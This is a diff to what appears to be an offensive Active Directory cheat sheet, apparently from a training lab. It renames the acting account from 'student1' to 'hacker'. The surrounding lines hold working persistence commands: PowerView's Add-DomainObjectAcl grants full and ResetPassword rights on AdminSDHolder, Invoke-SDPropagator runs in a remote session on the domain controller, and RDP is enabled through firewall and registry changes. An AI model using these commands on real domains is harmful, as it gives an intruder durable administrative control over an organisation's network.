@@ -811,13 +811,13 @@ Import-Module powerview.ps1
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=hacked,DC=local' -PrincipalIdentity hacker -Rights All -Verbose
 
 #Other interesting permissions (ResetPassword, WriteMembers)
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=hacked,DC=local' -PrincipalIdentity student1 -Rights ResetPassword -Verbose
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=hacked,DC=local' -PrincipalIdentity hacker -Rights ResetPassword -Verbose
 
 Invoking SDpropagator ---
 https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory
 
 #Create session to DC and load Invoke-SDPropagator.ps1 in the session
-$sess = New-PSSession -ComputerName dc.hacked.local -credential student1
+$sess = New-PSSession -ComputerName dc.hacked.local -credential hacker
 Invoke-Command -FilePath .\Invoke-SDPropagator.ps1 -Session $sess
 Enter-PSSession -Session $sess
 
@@ -862,11 +862,3 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
 #Enable authentication via RDP
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-
-
-
-
-
-
-
-
